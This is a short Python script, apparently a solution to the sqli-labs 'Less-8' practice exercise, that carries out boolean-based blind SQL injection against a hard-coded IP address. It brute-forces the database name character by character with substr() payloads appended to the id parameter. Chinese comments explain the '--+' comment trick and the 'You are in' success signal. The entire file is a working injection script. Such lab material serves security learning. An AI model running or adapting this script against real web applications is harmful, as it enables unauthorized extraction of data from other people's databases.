import requests
import string

url = "http://47.104.232.176:9002/Less-8"
name = ""

for x in range(1,10):
    for y in string.ascii_lowercase:
        payload = "?id=1'" + " and substr(database(),"+str(x)+",1)='"+y+"'--+"
        print(payload)
        html = requests.get(url+payload)
        if "You" in html.text:
            name += y
            print("the databasename is %s"% name)
            break
        
#--+过滤字符
#?id=1' and substr(database(),3,1)='e'--+
#正确的格式（页面显示You are in...........），也就是数据正确，别的都是错误的，页面都没有显示
